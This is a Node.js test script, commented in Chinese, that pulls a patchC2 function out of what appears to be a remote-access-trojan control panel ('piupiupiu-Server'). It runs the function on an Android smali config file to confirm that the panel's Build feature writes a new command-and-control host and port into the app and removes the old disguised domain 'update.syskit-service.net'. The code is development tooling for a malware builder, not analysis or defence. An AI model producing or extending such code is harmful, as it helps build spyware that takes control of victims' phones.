// 从 AppCtrl.js 里抽出 patchC2 并在真实 smali 上跑一遍，验证替换逻辑确实生效。
// 目的：面板的 Build 功能靠这段逻辑写 C2，之前它依赖 "http://" + "?model=" 两个字面量，
// 客户端改成 AppConfig 后这两个锚点的行为变了，必须实测而不是想当然。
const fs = require('fs');
const path = require('path');

const appCtrlPath = path.join(__dirname, '..', 'piupiupiu-Server', 'app', 'app', 'assets', 'js', 'controllers', 'AppCtrl.js');
const smaliPath = path.join(__dirname, '..', 'piupiupiu-Server', 'app', 'app', 'Factory', 'piupiupiu', 'smali', 'com', 'piupiupiu', 'AppConfig.smali');

const src = fs.readFileSync(appCtrlPath, 'utf8');
const startMarker = '$appCtrl.patchC2 = (data, ip, port) => {';
const start = src.indexOf(startMarker);
if (start === -1) { console.error('未找到 patchC2 定义'); process.exit(1); }
// 截取到该函数的闭合 "    }"
const end = src.indexOf('\n    }\n', start);
if (end === -1) { console.error('未找到函数结尾'); process.exit(1); }
const fnSrc = src.slice(start, end + '\n    }\n'.length);

const $appCtrl = {};
eval(fnSrc);

const original = fs.readFileSync(smaliPath, 'utf8');
const out = $appCtrl.patchC2(original, '203.0.113.7', '9999');

if (out === null) {
    console.error('FAIL: patchC2 返回 null —— 新 smali 上没有命中任何锚点');
    process.exit(1);
}

const checks = [
    ['新 C2 已写入', out.includes('http://203.0.113.7:9999')],
    ['新 C2_HOST 字段', out.includes('C2_HOST:Ljava/lang/String; = "203.0.113.7"')],
    ['新 C2_PORT 字段', out.includes('C2_PORT:I = 9999')],
    ['旧域名已消失', !out.includes('update.syskit-service.net')],
    ['旧端口 0x1f90 已消失', !out.includes('0x1f90')],
];

let ok = true;
for (const [name, pass] of checks) {
    console.log(`  ${name.padEnd(24)}${pass ? 'PASS' : 'FAIL'}`);
    if (!pass) ok = false;
}

console.log('\n--- 替换后的 c2Base() ---');
const m = out.match(/const-string v\d+, "[^"]*"/g);
console.log(m ? m.join('\n') : '(无)');

process.exit(ok ? 0 : 1);
